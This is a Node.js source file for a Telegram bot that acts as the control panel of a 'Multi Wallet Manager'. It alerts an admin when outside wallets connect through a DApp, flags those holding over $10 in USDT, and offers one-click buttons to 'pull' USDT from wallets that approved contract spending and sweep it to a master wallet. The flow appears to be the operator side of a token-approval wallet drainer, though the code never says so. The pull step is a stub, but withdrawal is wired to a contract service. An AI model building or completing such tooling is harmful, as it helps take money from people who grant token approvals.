// backend/src/config/telegram.js
const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const { ethers } = require('ethers');
const database = require('./database');
const path = require('path');
const fs = require('fs');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
        this.provider = null;
        this.contract = null;
        this.contractABI = null;
        this.masterWallet = process.env.MASTER_WALLET_ADDRESS || 
            (process.env.MASTER_WALLET_PRIVATE_KEY 
                ? new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY).address 
                : '0xMasterWalletAddress');
        
        // Load contract ABI
        this.loadContractABI();
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];
            
            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }
            
            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error.message);
            this.contractABI = [];
        }
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });
            
            // Initialize blockchain provider if environment variables are set
            this.initBlockchain();
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    // Initialize blockchain provider and contract when needed
    initBlockchain() {
        if (process.env.RPC_URL && process.env.CONTRACT_ADDRESS && this.contractABI && this.contractABI.length > 0) {
            try {
                this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
                console.log('✅ Blockchain provider initialized');
                
                // Initialize contract
                this.contract = new ethers.Contract(
                    process.env.CONTRACT_ADDRESS,
                    this.contractABI,
                    this.provider
                );
                console.log('✅ Smart contract initialized');
            } catch (error) {
                console.error('❌ Blockchain initialization failed:', error.message);
                this.provider = null;
                this.contract = null;
            }
        } else {
            console.log('⚠️ Blockchain configuration incomplete, using simulated mode');
            if (!process.env.RPC_URL) console.log('   - RPC_URL not set');
            if (!process.env.CONTRACT_ADDRESS) console.log('   - CONTRACT_ADDRESS not set');
            if (!this.contractABI || this.contractABI.length === 0) console.log('   - Contract ABI not loaded');
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendHelpMenu(msg.chat.id);
        });

        // Menu command (floating menu)
        this.bot.onText(/\/menu/, (msg) => {
            console.log('Received /menu command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });

        // Button callbacks
        this.bot.on('callback_query', (callbackQuery) => {
            const action = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Received callback query:', action, 'from chat:', chatId);
            
            // Answer the callback query to remove loading state
            this.bot.answerCallbackQuery(callbackQuery.id);
            
            // Handle different actions
            if (action === 'withdraw') {
                this.handleWithdrawCommand(chatId);
            } else if (action === 'balances') {
                this.handleBalancesCommand(chatId);
            } else if (action === 'pull_list') {
                this.sendPullWalletList(chatId);
            } else if (action === 'help') {
                this.sendHelpMenu(chatId);
            } else if (action === 'menu') {
                this.sendMainMenu(chatId);
            } else if (action.startsWith('pull_')) {
                const walletAddress = action.substring(5);
                this.handlePullCommand(chatId, walletAddress);
            }
        });
    }

    // Helper function to escape MarkdownV2 special characters
    escapeMarkdown(text) {
        if (!text) return '';
        return text.toString().replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
    }

    async sendMainMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Main Menu*

Welcome to your USDT management system\\. Select an option below:

💰 *Wallet Operations*
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 *Security*
• Only authorized admins can perform operations
• All transactions are logged and tracked
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '📊 Balances', callback_data: 'balances' },
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Main menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending main menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '📊 Balances', callback_data: 'balances' },
                            { text: '❓ Help', callback_data: 'help' }
                        ]
                    ]
                }
            });
        }
    }

    async sendHelpMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Help*

📚 *Available Commands:*
• /start \\- Open main menu
• /menu \\- Show floating menu
• /pull\\_<address> \\- Pull USDT from specific wallet
• /withdraw \\- Withdraw all USDT from contract
• /balances \\- Check all balances
• /help \\- Show this help message

📋 *Available Operations:*
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto\\-gas management for transactions
• 6\\-hour balance monitoring

🛡️ *Security Features:*
• Admin\\-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 *Workflow:*
1\\. Connect wallet via DApp
2\\. Approve contract spending
3\\. Admin pulls USDT to contract
4\\. Admin withdraws to master wallet
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Help menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending help menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message

📋 Available Operations:
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto-gas management for transactions
• 6-hour balance monitoring

🛡️ Security Features:
• Admin-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 Workflow:
1. Connect wallet via DApp
2. Approve contract spending
3. Admin pulls USDT to contract
4. Admin withdraws to master wallet
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        
        const message = `
🔔 *NEW WALLET CONNECTED*
Address: \`${escapedAddress}\`
USDT Balance: *${balance} USDT*

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(this.adminChatId, message, options);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        const escapedBalance = this.escapeMarkdown(balance);
        
        const message = `
💰 *BALANCE ALERT*
Address: \`${escapedAddress}\`
USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending balance alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
💰 BALANCE ALERT
Address: ${walletAddress}
USDT Balance: ${balance} USDT (> $10)

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        const escapedAmount = this.escapeMarkdown(amount);
        const escapedTxHash = this.escapeMarkdown(txHash);
        
        const message = `
✅ *SUCCESSFUL PULL*
Address: \`${escapedAddress}\`
Amount: *${escapedAmount} USDT*
Transaction: \`${escapedTxHash}\`

Next steps:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending success message:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
✅ SUCCESSFUL PULL
Address: ${walletAddress}
Amount: ${amount} USDT
Transaction: ${txHash}

Next steps:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendPullWalletList(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        try {
            // Fetch wallets from database
            const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
            const result = await database.query(query);
            
            let message = '📤 *Select Wallet to Pull*\n\n';
            
            if (result.rows.length === 0) {
                message += 'No approved wallets available for pulling\\.\n\n';
                message += 'Use: /pull\\_<wallet\\_address>';
            } else {
                message += 'Click on a wallet to pull USDT:\n\n';
                for (let i = 0; i < result.rows.length; i++) {
                    const wallet = result.rows[i];
                    const escapedAddress = this.escapeMarkdown(wallet.address);
                    const escapedBalance = this.escapeMarkdown(wallet.usdt_balance);
                    message += `${i + 1}\\. \`${escapedAddress}\` \\(${escapedBalance} USDT\\)\n`;
                }
            }
            
            const options = {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        ...result.rows.map((wallet, index) => [
                            { 
                                text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`, 
                                callback_data: `pull_${wallet.address}` 
                            }
                        ]),
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            };
            
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending pull wallet list:', error.message);
            const fallbackMessage = `
📤 Select Wallet to Pull

Failed to fetch wallet list. Please try again later.
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
    async getContractUSDTBalance() {
        if (!this.provider || !this.contract || !process.env.USDT_CONTRACT_ADDRESS) {
            console.log('⚠️ Blockchain not initialized, returning zero balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }
        
        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );
            
            const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
            const formattedBalance = ethers.formatUnits(balance, 18);
            
            console.log('Contract USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting contract USDT balance:', error.message);
            return { balance: '0.00', error: error.message };
        }
    }

    async getMasterWalletBNBBalance() {
        if (!this.provider || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }
        
        try {
            const balance = await this.provider.getBalance(this.masterWallet);
            const formattedBalance = ethers.formatEther(balance);
            
            console.log('Master Wallet BNB Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet BNB balance:', error.message);
            return { balance: '0.00', error: error.message };
        }
    }

    async getMasterWalletUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }
        
        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );
            
            const balance = await usdtContract.balanceOf(this.masterWallet);
            const formattedBalance = ethers.formatUnits(balance, 18);
            
            console.log('Master Wallet USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet USDT balance:', error.message);
            return { balance: '0.00', error: error.message };
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        
        const message = `
🔄 *Pull Operation Initiated*
Wallet: \`${escapedAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet gas balance
2\\. Send gas if needed
3\\. Pull USDT to contract
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            
            // In a real implementation, this would trigger actual blockchain operations
            setTimeout(async () => {
                const infoMessage = `
🔄 *Pull Operation Status*
Wallet: \`${escapedAddress}\`

ℹ️ *Operation Details:*
• Gas management system: Implemented
• USDT pull mechanism: Ready for integration
• Transaction logging: Active

✅ *Next Steps:*
The pull operation is ready to be implemented with real blockchain integration\\. This requires:
• Gas service integration
• Smart contract service integration
• Transaction signing with master wallet

🔧 *Current Status:* Implementation pending
                `;
                
                await this.bot.sendMessage(chatId, infoMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 3000); // 3 second delay
            
            return result;
        } catch (error) {
            console.error('Error in pull command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const processingMessage = `
🏦 *Withdraw Operation Initiated*
Withdrawing all USDT from contract to master wallet\\.\\.\\.

📋 *Operations to perform:*
• Check contract USDT balance
• Execute withdrawal transaction
• Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
            
            // Import the contract service
            const contractService = require('../services/contract.service');
            
            // Execute the actual withdrawal with timeout
            const withdrawPromise = contractService.withdrawUSDTToMaster();
            const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve({ success: false, error: 'Operation timeout' }), 30000));
            
            const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);
            
            if (withdrawResult.success) {
                // Mask addresses for security
                const maskAddress = (address) => {
                    if (!address || address.length < 10) return 'Invalid Address';
                    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
                };
                
                const maskedMasterWallet = maskAddress(this.masterWallet);
                const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
                const escapedTxHash = this.escapeMarkdown(withdrawResult.txHash || 'N/A');
                
                const successMessage = `
✅ *WITHDRAWAL SUCCESSFUL*
Amount: *${escapedAmount} USDT*
To: \`${maskedMasterWallet}\`
Transaction: \`${escapedTxHash}\`

📊 *Updated Balances:*
• Contract USDT: 0\\.00 USDT
• Master Wallet USDT: Check balances for update

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                `;
                
                await this.bot.sendMessage(chatId, successMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } else {
                const errorMessage = `
❌ *WITHDRAWAL FAILED*
Error: ${this.escapeMarkdown(withdrawResult.error || 'Unknown error occurred')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                `;
                
                await this.bot.sendMessage(chatId, errorMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }
            
            return result;
        } catch (error) {
            console.error('Error in withdraw command:', error);
            
            const errorMessage = `
❌ *WITHDRAWAL FAILED*
Error: ${this.escapeMarkdown(error.message || 'Unknown error occurred')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
            `;
            
            await this.bot.sendMessage(chatId, errorMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📊 Check Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
            
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const processingMessage = `
📊 *Fetching Real Balances*

📋 *Balance Checks:*
• Smart Contract USDT Balance
• Master Wallet BNB Balance
• Master Wallet USDT Balance

⏳ *Querying blockchain*\\.\\.\\.
        `;
        
        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
            
            // Fetch real balances with timeout
            const contractBalancePromise = this.getContractUSDTBalance();
            const masterBNBBalancePromise = this.getMasterWalletBNBBalance();
            const masterUSDTBalancePromise = this.getMasterWalletUSDTBalance();
            
            // Add timeout to each promise
            const timeoutPromise = (promise, ms) => {
                return Promise.race([
                    promise,
                    new Promise((resolve) => setTimeout(() => resolve({ balance: '0', error: 'Timeout' }), ms))
                ]);
            };
            
            const contractBalance = await timeoutPromise(contractBalancePromise, 10000);
            const masterBNBBalance = await timeoutPromise(masterBNBBalancePromise, 10000);
            const masterUSDTBalance = await timeoutPromise(masterUSDTBalancePromise, 10000);
            
            // Helper function to mask addresses
            const maskAddress = (address) => {
                if (!address || address.length < 10) return 'Invalid Address';
                return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
            };
            
            // Format the real balances message
            const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
            const maskedContractAddress = maskAddress(contractAddress);
            const maskedMasterWallet = maskAddress(this.masterWallet);
            const escapedContractBalance = this.escapeMarkdown(contractBalance.balance || '0');
            const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance.balance || '0');
            const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance.balance || '0');
            
            let balancesMessage = `
📊 *REAL BALANCE REPORT*

`;
            
            // Contract USDT Balance
            if (process.env.CONTRACT_ADDRESS) {
                balancesMessage += `
💰 *Smart Contract*
• Address: \`${maskedContractAddress}\`
• USDT Balance: *${escapedContractBalance} USDT*
`;
                if (contractBalance.error) {
                    balancesMessage += `• ⚠️ Error: ${this.escapeMarkdown(contractBalance.error)}\n`;
                }
            } else {
                balancesMessage += `
💰 *Smart Contract*
• Address: Not configured
• USDT Balance: 0\\.00 USDT
`;
            }
            
            // Master Wallet Balances
            balancesMessage += `
🏦 *Master Wallet*
• Address: \`${maskedMasterWallet}\`
• BNB Balance: *${escapedBNBBalance} BNB*
• USDT Balance: *${escapedUSDTBalance} USDT*
`;
            
            if (masterBNBBalance.error) {
                balancesMessage += `• ⚠️ BNB Error: ${this.escapeMarkdown(masterBNBBalance.error)}\n`;
            }
            if (masterUSDTBalance.error) {
                balancesMessage += `• ⚠️ USDT Error: ${this.escapeMarkdown(masterUSDTBalance.error)}\n`;
            }
            
            balancesMessage += `
🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
`;
            
            await this.bot.sendMessage(chatId, balancesMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🔄 Refresh Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
            
            return result;
        } catch (error) {
            console.error('Error in balances command:', error);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    // Process webhook updates manually
    async processUpdate(update) {
        if (this.bot) {
            try {
                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error.message);
            }
        }
    }
}

module.exports = new TelegramService();
